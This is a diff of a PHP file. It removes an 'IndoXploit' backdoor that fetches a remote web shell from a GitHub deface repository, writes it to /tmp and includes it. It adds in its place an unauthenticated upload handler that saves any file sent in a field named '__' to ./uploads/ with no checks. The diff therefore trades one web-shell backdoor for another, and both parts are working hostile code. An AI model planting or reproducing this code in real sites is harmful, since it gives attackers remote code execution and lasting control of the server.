@@ -1,26 +1,18 @@
 <?php
-# IndoXploit TMP Backdoor
-# Bypass 406 Not Acceptable & Auto Delete Shell (WAF Evasion Shell)
-# Coded by: L0c4lh34rtz - IndoXploit
- 
-$data = ['https://raw.githubusercontent.com/CXFTEAMS/deface/main/alfa.php', '/tmp/sess_'.md5($_SERVER['HTTP_HOST']).'.php'];
- 
-if(file_exists($data[1]) && filesize($data[1]) !== 0) {
-    include($data[1]);
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    if (isset($_FILES['__'])) {
+        $uploadDir = './uploads/';  // Specify the directory where you want to save the uploaded files
+        $uploadFile = $uploadDir . basename($_FILES['__']['name']);
+
+        if (move_uploaded_file($_FILES['__']['tmp_name'], $uploadFile)) {
+            echo 'OK';
+        } else {
+            echo 'ER';
+        }
+    } else {
+        echo 'No file uploaded.';
+    }
 } else {
-    $fopen = fopen($data[1], 'w+');
-    fwrite($fopen, get($data[0]));
-    fclose($fopen);
-    echo '<script>window.location="?indoxploit";</script>';
-}
- 
-function get($url) {
-    $ch = curl_init();
-          curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
-          curl_setopt($ch, CURLOPT_URL, $url);
-          curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
-          curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
-    return curl_exec($ch);
-          curl_close($ch);
+    echo 'Invalid request.';
 }
 ?>
